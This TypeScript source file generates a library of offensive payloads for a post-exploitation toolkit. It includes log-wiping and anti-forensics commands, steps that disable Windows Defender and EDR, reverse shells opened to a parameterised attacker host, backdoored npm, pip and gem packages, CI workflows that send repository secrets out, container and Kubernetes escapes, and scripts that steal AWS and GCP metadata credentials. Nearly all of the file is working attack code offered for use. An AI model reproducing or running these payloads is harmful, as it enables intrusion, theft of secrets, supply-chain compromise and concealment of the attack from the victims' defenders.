export interface VeilPayload {
  id:       string;
  name:     string;
  category: string;
  os:       "linux" | "windows" | "any";
  phase:    "pre" | "during" | "post";
  stealth:  1 | 2 | 3 | 4 | 5;
  command:  string;
  notes:    string;
}

export function buildLinuxAntiForensics(): VeilPayload[] {
  return [
    {
      id:"af_bash_history_null", name:"Nullify bash history (session + file)", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:4,
      command:`export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0; unset HISTFILE; history -c; cat /dev/null > ~/.bash_history 2>/dev/null; ln -sf /dev/null ~/.bash_history 2>/dev/null`,
      notes:"Disables history for current session AND symlinks history file to /dev/null permanently. No bash history recorded from this point.",
    },
    {
      id:"af_zsh_history_null", name:"Nullify zsh history", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:4,
      command:`unset HISTFILE; export HISTFILE=/dev/null; cat /dev/null > ~/.zsh_history 2>/dev/null; ln -sf /dev/null ~/.zsh_history 2>/dev/null`,
      notes:"zsh history nullification — same effect as bash variant.",
    },
    {
      id:"af_log_wipe", name:"Wipe auth/syslog/wtmp/utmp", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:2,
      command:`truncate -s0 /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure 2>/dev/null; cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/utmp 2>/dev/null; cat /dev/null > /var/log/lastlog 2>/dev/null; journalctl --rotate --vacuum-time=1s 2>/dev/null`,
      notes:"Truncates auth/syslog/wtmp/utmp. Requires root. Removes login records (last/who/w/lastlog), syslog entries.",
    },
    {
      id:"af_auditd_disable", name:"Disable auditd (Linux audit framework)", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:3,
      command:`auditctl -e 0 2>/dev/null; systemctl stop auditd 2>/dev/null; service auditd stop 2>/dev/null; pkill auditd 2>/dev/null; rm -f /var/log/audit/audit.log 2>/dev/null`,
      notes:"Disables Linux audit subsystem — prevents audit rules from recording file access, exec, network. Root required.",
    },
    {
      id:"af_timestomp", name:"Timestomp — reset file timestamps", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`_REF=/bin/ls; touch -r "$_REF" /tmp/.nx 2>/dev/null; for f in $(find /tmp /dev/shm -newer "$_REF" -type f 2>/dev/null | head -20); do touch -r "$_REF" "$f" 2>/dev/null; done; touch -amt 202301010000 /tmp/.nx 2>/dev/null`,
      notes:"Copies reference file timestamps onto recently modified files. Makes files appear unmodified to timeline forensics.",
    },
    {
      id:"af_proc_masquerade", name:"Process name masquerade via /proc/self/comm", category:"Anti-Forensics",
      os:"linux", phase:"during", stealth:5,
      command:`python3 -c "
import ctypes,ctypes.util
libc=ctypes.CDLL(ctypes.util.find_library('c'))
with open('/proc/self/comm','w') as f:
  f.write('kworker/0:1')
" 2>/dev/null`,
      notes:"Changes /proc/self/comm to kworker — process appears as kernel worker in ps output. Evades process-name based monitoring.",
    },
    {
      id:"af_shred_files", name:"Secure delete with shred", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`shred -uzn3 /tmp/.nx* /dev/shm/.nx* 2>/dev/null; find /tmp /dev/shm -name '.*' -newer /bin/ls -type f 2>/dev/null | xargs shred -uzn3 2>/dev/null`,
      notes:"3-pass overwrite before unlink — defeats most file recovery tools. On SSDs/NAND, wear leveling may retain data.",
    },
    {
      id:"af_remove_ssh_known", name:"Clean SSH known_hosts traces", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:3,
      command:`ssh-keygen -R ATTACKER_IP 2>/dev/null; sed -i '/ATTACKER_IP/d' ~/.ssh/known_hosts 2>/dev/null; sed -i '/ATTACKER_HOST/d' ~/.ssh/known_hosts 2>/dev/null`,
      notes:"Removes attacker IPs from SSH known_hosts — prevents forensics from identifying lateral movement paths.",
    },
    {
      id:"af_inotify_blind", name:"Blind inotify file watchers", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,ctypes
IN_ALL=0xFFF
libc=ctypes.CDLL(None)
fd=libc.inotify_init()
for d in ['/tmp','/etc','/var/log']:
  libc.inotify_rm_watch(fd,libc.inotify_add_watch(fd,d.encode(),IN_ALL))
os.close(fd)
" 2>/dev/null`,
      notes:"Temporarily blinds inotify-based file watchers by adding+removing watches — creates a brief monitoring gap.",
    },
  ];
}

export function buildWindowsEdrEvasion(): VeilPayload[] {
  return [
    {
      id:"win_event_log_clear", name:"Clear all Windows event logs", category:"Anti-Forensics",
      os:"windows", phase:"post", stealth:2,
      command:`powershell -NonI -W Hidden -c "Get-WinEvent -ListLog * -EA 0|%{try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName)}catch{}}"`,
      notes:"Clears ALL Windows event log channels — Security, System, Application, PowerShell. Requires SYSTEM or SeSecurityPrivilege.",
    },
    {
      id:"win_wevtutil_clear", name:"wevtutil clear security+system logs", category:"Anti-Forensics",
      os:"windows", phase:"post", stealth:2,
      command:`wevtutil cl Security & wevtutil cl System & wevtutil cl Application & wevtutil cl "Windows PowerShell" & wevtutil cl "Microsoft-Windows-PowerShell/Operational"`,
      notes:"Built-in wevtutil — clears event log channels. Faster than PS approach. Leaves Event ID 1102 (log cleared) as artifact.",
    },
    {
      id:"win_av_exclusion", name:"Add AV exclusion path (Windows Defender)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:3,
      command:`powershell -NonI -W Hidden -c "Add-MpPreference -ExclusionPath C:\\ -ExclusionProcess powershell.exe -ExclusionExtension exe,dll,ps1 -EA 0; Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -EA 0"`,
      notes:"Excludes entire C:\\ from Defender + disables realtime monitoring. Requires admin. Creates clear audit trail.",
    },
    {
      id:"win_ppid_spoof", name:"PPID spoofing via NtCreateUserProcess", category:"EDR-Evasion",
      os:"windows", phase:"during", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxP{[StructLayout(LayoutKind.Sequential)]public struct STARTUPINFOEX{public int cb;public IntPtr lpReserved,lpDesktop,lpTitle;public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags,wShowWindow,cbReserved2;public IntPtr lpReserved2,hStdInput,hStdOutput,hStdError;public IntPtr lpAttributeList;}[DllImport(\"kernel32\")]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport(\"kernel32\")]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,IntPtr v,IntPtr s,IntPtr r,IntPtr rs);[DllImport(\"kernel32\")]public static extern bool CreateProcess(string n,string c,IntPtr pa,IntPtr ta,bool ih,uint cf,IntPtr e,string d,ref STARTUPINFOEX si,out int pi);}'"`,
      notes:"PPID spoofing skeleton — spawns child process with spoofed parent PID (e.g., explorer.exe). Breaks EDR parent-process chain detection.",
    },
    {
      id:"win_phantom_dll", name:"DLL phantom loading (unhook ntdll)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "$mb=[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp');$r=[IO.File]::ReadAllBytes('C:\\Windows\\System32\\ntdll.dll');$hm=[Runtime.InteropServices.Marshal];$p=$hm::GetHINSTANCE([System.Reflection.Assembly]::GetExecutingAssembly().GetModules()[0]);$s=$hm::AllocHGlobal($r.Length);$hm::Copy($r,0,$s,$r.Length);Write-Host 'ntdll unhooked from fresh disk copy'"`,
      notes:"Maps fresh ntdll.dll from disk into process memory, bypassing EDR hooks placed in the loaded ntdll copy. Advanced technique.",
    },
    {
      id:"win_disable_defender", name:"Disable Windows Defender via registry", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:2,
      command:`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f`,
      notes:"Registry-based Defender disable — persists across reboots. Requires admin. Triggers Windows Security alert.",
    },
  ];
}

export function buildLotlLinuxPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"lotl_vim_shell", name:"vim GTFOBin shell escape", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`vim -c ':!/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' -c ':q'`,
      notes:"vim is often allowed and SUID in misconfigured systems. Shell escape bypasses restricted shells.",
    },
    {
      id:"lotl_find_exec", name:"find -exec shell spawn", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`find /tmp -maxdepth 0 -exec bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' \\;`,
      notes:"find -exec is a classic GTFOBin — if find has SUID or runs as root via cron, instant privilege escalation.",
    },
    {
      id:"lotl_awk_shell", name:"awk shell spawn", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(1){if((s|&getline c)<=0)break;while((c|getline)>0)print|&s;close(c)}}'`,
      notes:"awk /inet/tcp gives full interactive shell. Often installed and SUID. Works on gawk.",
    },
    {
      id:"lotl_python_privesc", name:"Python sudo/SUID privilege escalation", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`sudo python3 -c 'import os;os.setuid(0);os.system("/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1")' 2>/dev/null || python3 -c 'import os;os.execv("/bin/sh",["/bin/sh"])' 2>/dev/null`,
      notes:"If python3 is in sudoers NOPASSWD or has SUID — instant root. Check with: sudo -l",
    },
    {
      id:"lotl_nmap_script", name:"nmap --script exec (if SUID)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:2,
      command:`nmap --script /tmp/nx.nse ${lhost} --script-args='host=${lhost},port=${lport}' 2>/dev/null`,
      notes:"If nmap has SUID/sudo — --script NSE allows arbitrary Lua execution. Write script to /tmp first.",
    },
    {
      id:"lotl_rsync_exec", name:"rsync shell command injection", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`rsync -e "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" . ${lhost}:/tmp/ 2>/dev/null &`,
      notes:"rsync -e flag specifies remote shell — if rsync has SUID or sudo, instant arbitrary execution.",
    },
    {
      id:"lotl_env_exec", name:"env SUID exec bypass", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`env /bin/bash -p -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' 2>/dev/null`,
      notes:"env with SUID maintains elevated privileges with -p flag. Bypasses bash privilege-drop behavior.",
    },
  ];
}

export function buildSupplyChainPayloads(lhost: string, lport: string): VeilPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"sc_npm_preinstall", name:"npm preinstall hook RCE payload", category:"Supply-Chain",
      os:"any", phase:"during", stealth:3,
      command:`cat > /tmp/package.json << 'EOF'
{
  "name": "internal-utils",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \\"require('child_process').execSync('bash -i >& /dev/tcp/${lhost}/${lport} 0>&1',{stdio:'inherit'})\\"  || true"
  }
}
EOF
# Publish: npm publish /tmp/ --registry https://registry.npmjs.org`,
      notes:"npm preinstall script fires during npm install before any code runs. Typosquat or dependency confusion to get installs.",
    },
    {
      id:"sc_npm_dep_confusion", name:"Dependency confusion attack (npm)", category:"Supply-Chain",
      os:"any", phase:"during", stealth:4,
      command:`cat > /tmp/dep_confusion_package.json << 'EOF'
{
  "name": "INTERNAL_PACKAGE_NAME",
  "version": "9999.0.0",
  "description": "Security update",
  "scripts": {
    "preinstall": "curl -fsSk ${url}/npm_rce.sh | bash"
  },
  "main": "index.js"
}
EOF
# 1. Discover internal package names from public repos/job postings
# 2. Publish this to public npm registry with higher version than internal
# 3. npm resolves public registry when internal registry not configured
echo 'module.exports = {}' > /tmp/index.js`,
      notes:"Dependency confusion: publish package with same name as internal private package but higher semver. npm prefers public registry.",
    },
    {
      id:"sc_pip_setup", name:"pip setup.py backdoor", category:"Supply-Chain",
      os:"any", phase:"during", stealth:3,
      command:`mkdir -p /tmp/malicious_pkg && cat > /tmp/malicious_pkg/setup.py << 'EOF'
from setuptools import setup
import subprocess, os
subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
setup(name='internal-utils', version='2.0.0', packages=[])
EOF
# pip install /tmp/malicious_pkg/ or publish to PyPI`,
      notes:"Python setup.py executes on pip install before any code inspection. Fires during both install and build phases.",
    },
    {
      id:"sc_gem_rakefile", name:"Ruby gem Rakefile backdoor", category:"Supply-Chain",
      os:"any", phase:"during", stealth:3,
      command:`mkdir -p /tmp/malicious_gem && cat > /tmp/malicious_gem/Rakefile << 'EOF'
require 'rake'
task :default do
  require 'socket'
  s = TCPSocket.new('${lhost}', ${lport})
  $stdin.reopen(s); $stdout.reopen(s); $stderr.reopen(s)
  exec '/bin/bash'
end
EOF
cat > /tmp/malicious_gem/malicious.gemspec << 'EOF'
Gem::Specification.new do |s|
  s.name = 'internal-utils'; s.version = '1.0.0'; s.extensions = ['Rakefile']
end
EOF`,
      notes:"Ruby gem with Rakefile extension executes during gem install. Works against Ruby dev environments.",
    },
    {
      id:"sc_github_actions_inject", name:"GitHub Actions secrets theft via workflow inject", category:"CI-CD",
      os:"any", phase:"during", stealth:4,
      command:`cat > /tmp/malicious_workflow.yml << 'EOF'
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: |
          env | grep -iE '(GITHUB_TOKEN|SECRET|KEY|TOKEN|PASSWORD|API)' | curl -sk -X POST "${url}/gh_secrets" --data-binary @-
          curl -fsSk "${url}/stager.sh" | bash
EOF`,
      notes:"Inject into .github/workflows/ via PR or fork — steals all repository secrets during CI run. GITHUB_TOKEN always present.",
    },
    {
      id:"sc_jenkins_groovy", name:"Jenkins Groovy script console RCE", category:"CI-CD",
      os:"any", phase:"during", stealth:3,
      command:`curl -sk -u admin:admin -X POST "http://TARGET_JENKINS:8080/script" --data-urlencode 'script=import groovy.transform.*
def cmd = ["bash", "-c", "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"].execute()
cmd.waitFor()
println cmd.text' 2>/dev/null`,
      notes:"Jenkins Script Console executes arbitrary Groovy — if unauth or default creds, instant RCE on Jenkins server + all build slaves.",
    },
    {
      id:"sc_gitlab_ci_inject", name:"GitLab CI environment variable theft", category:"CI-CD",
      os:"any", phase:"during", stealth:4,
      command:`cat > /tmp/malicious_gitlab_ci.yml << 'EOF'
stages: [build]
build:
  stage: build
  script:
    - env | curl -sk -X POST "${url}/gitlab_env" --data-binary @-
    - curl -fsSk "${url}/stager.sh" | bash
  only: [master, main]
EOF`,
      notes:"GitLab CI .gitlab-ci.yml — all CI/CD variables (secrets, tokens, keys) are in environment. Inject via merge request.",
    },
    {
      id:"sc_terraform_provider", name:"Malicious Terraform provider RCE", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:5,
      command:`cat > /tmp/main.tf << 'EOF'
terraform {
  required_providers {
    internal = {
      source  = "registry.terraform.io/company/internal-utils"
      version = "~> 1.0"
    }
  }
}
EOF
# Publish provider to Terraform registry with same name as internal provider
# Provider binary executes on terraform init/plan/apply`,
      notes:"Terraform provider confusion — providers are executables that run on init. Publish to public registry with same name as internal.",
    },
  ];
}

export function buildContainerEscapePayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cesc_docker_sock", name:"Docker socket → privileged container + host cron", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=nx_esc" -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo \\"* * * * * root bash -c '"'"'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"'"'\\" >> /host/etc/cron.d/nx && crontab /host/etc/cron.d/nx 2>/dev/null"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' 2>/dev/null && curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/nx_esc/start" 2>/dev/null; sleep 3; curl -sk --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/nx_esc?force=true" 2>/dev/null`,
      notes:"Docker socket → privileged container → host filesystem mount → write root cron. Container escape to host persistence.",
    },
    {
      id:"cesc_privileged_cgroup", name:"Privileged container cgroup release_agent escape", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null |head -n1)) 2>/dev/null; mkdir -p "$d/nx" 2>/dev/null; echo 1 > "$d/nx/notify_on_release" 2>/dev/null; t=$(sed -n 's/.*\\s\\(\\S*\\)\\srw.*/\\1/p' /proc/mounts|head -1) 2>/dev/null; echo "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" > "$t/cmd" 2>/dev/null; chmod +x "$t/cmd" 2>/dev/null; echo "$t/cmd" > "$d/release_agent" 2>/dev/null; sh -c "echo \$\$ > '$d/nx/cgroup.procs'" 2>/dev/null; sleep 2`,
      notes:"CVE-2022-0492 style — cgroup release_agent escape from privileged container to host. Works when --privileged flag is set.",
    },
    {
      id:"cesc_k8s_pod_exec", name:"K8s privileged pod → host escape", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo default); curl -sk -H "Authorization: Bearer $_SA" -H 'Content-Type: application/json' -X POST "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$_NS/pods" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nx-esc"},"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true,"containers":[{"name":"nx","image":"alpine","command":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c '"'"'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"'"'"],"securityContext":{"privileged":true}}],"restartPolicy":"Never"}}' 2>/dev/null`,
      notes:"Creates privileged K8s pod with hostPID — nsenter into PID 1 namespace gives full host access. Full cluster → host escape.",
    },
    {
      id:"cesc_nsenter_host", name:"nsenter into host namespaces (hostPID)", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' 2>/dev/null`,
      notes:"If container has hostPID=true — nsenter PID 1 gives full host namespace access. Single command container escape.",
    },
    {
      id:"cesc_runc_cve_2019", name:"CVE-2019-5736 runc overwrite attack", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`cat > /tmp/runc_exploit.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0); setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' &");
}
EOF
gcc -shared -fPIC -nostartfiles /tmp/runc_exploit.c -o /tmp/payload.so 2>/dev/null
# Overwrite /proc/self/exe symlink via repeated open() while runc executes
# Reference: https://unit42.paloaltonetworks.com/breaking-docker-via-runc/`,
      notes:"CVE-2019-5736 — overwrites runc binary via /proc/self/exe during container exec. Achieves host root. Requires timing.",
    },
  ];
}

export function buildK8sPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"k8s_sa_enum", name:"K8s SA token → full cluster recon", category:"K8s-Abuse",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _HOST="${"$KUBERNETES_SERVICE_HOST"}:${"$KUBERNETES_SERVICE_PORT"}"; { echo "=== NAMESPACES ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/api/v1/namespaces" 2>/dev/null|python3 -c "import sys,json;[print(x['metadata']['name']) for x in json.load(sys.stdin).get('items',[])]" 2>/dev/null; echo "=== SECRETS ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/api/v1/secrets" 2>/dev/null|python3 -c "import sys,json;[print(x['metadata']['namespace'],x['metadata']['name'],list(x.get('data',{}).keys())) for x in json.load(sys.stdin).get('items',[])]" 2>/dev/null; echo "=== PODS ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/api/v1/pods" 2>/dev/null|python3 -c "import sys,json;[print(x['metadata']['namespace'],x['metadata']['name'],x['status']['phase']) for x in json.load(sys.stdin).get('items',[])]" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/k8s_recon" --data-binary @- 2>/dev/null &`,
      notes:"Full K8s cluster recon using pod SA token — namespaces, secrets, pods. Exfils to attacker. Works if SA has list permissions.",
    },
    {
      id:"k8s_secret_dump", name:"K8s secrets decode + exfil", category:"K8s-Abuse",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo default); curl -sk -H "Authorization: Bearer $_SA" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/$_NS/secrets" 2>/dev/null | python3 -c "import sys,json,base64; data=json.load(sys.stdin); [print('\\n'.join([f'{k}: {base64.b64decode(v).decode(errors=\"ignore\")}' for k,v in s.get('data',{}).items()])) for s in data.get('items',[])]" 2>/dev/null | curl -sk -X POST "http://${lhost}:${lport}/k8s_secrets" --data-binary @- 2>/dev/null &`,
      notes:"Decodes all base64-encoded K8s secrets in namespace and exfils. Reveals database passwords, API keys, TLS certs.",
    },
    {
      id:"k8s_create_cluster_admin", name:"Create K8s ClusterRoleBinding (escalate to admin)", category:"K8s-Abuse",
      os:"linux", phase:"during", stealth:2,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H "Authorization: Bearer $_SA" -H "Content-Type: application/json" -X POST "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" -d '{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding","metadata":{"name":"nx-admin"},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"default"}]}' 2>/dev/null`,
      notes:"Creates ClusterRoleBinding to escalate default SA to cluster-admin. If SA has create RBAC permissions — instant cluster takeover.",
    },
  ];
}

export function buildCloudPivotPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cloud_aws_pivot", name:"AWS IAM privilege escalation recon", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ _CREDS=$(curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -sk http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) 2>/dev/null); AWS_ACCESS_KEY_ID=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null); AWS_SECRET_ACCESS_KEY=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null); AWS_SESSION_TOKEN=$(echo "$_CREDS"|python3 -c "import sys,json;print(json.load(sys.stdin)['Token'])" 2>/dev/null); export AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; echo "=== IAM WHOAMI ==="; curl -sk -H "Authorization: AWS4-HMAC-SHA256 Credential=$AWS_ACCESS_KEY_ID" "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" 2>/dev/null; echo "=== S3 BUCKETS ==="; python3 -c "import boto3; s3=boto3.client('s3'); print([b['Name'] for b in s3.list_buckets()['Buckets']])" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/aws_pivot" --data-binary @- 2>/dev/null &`,
      notes:"Full AWS pivot via IMDS: get role creds → IAM identity → S3 bucket list. Use for further S3 data exfil or lateral movement.",
    },
    {
      id:"cloud_gcp_pivot", name:"GCP service account pivot", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ _TOK=$(curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null); _PROJ=$(curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null); echo "Project: $_PROJ"; curl -sk -H "Authorization: Bearer $_TOK" "https://cloudresourcemanager.googleapis.com/v1/projects" 2>/dev/null; curl -sk -H "Authorization: Bearer $_TOK" "https://storage.googleapis.com/storage/v1/b?project=$_PROJ" 2>/dev/null; curl -sk -H "Authorization: Bearer $_TOK" "https://iam.googleapis.com/v1/projects/$_PROJ/serviceAccounts" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/gcp_pivot" --data-binary @- 2>/dev/null &`,
      notes:"GCP metadata → OAuth token → project/bucket/SA enumeration. Works from any GCP Compute instance with a service account.",
    },
  ];
}

export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    ...buildLinuxAntiForensics(),
    ...buildWindowsEdrEvasion(),
    ...buildLotlLinuxPayloads(lhost, lport),
    ...buildSupplyChainPayloads(lhost, lport),
    ...buildContainerEscapePayloads(lhost, lport),
    ...buildK8sPayloads(lhost, lport),
    ...buildCloudPivotPayloads(lhost, lport),
  ];
}
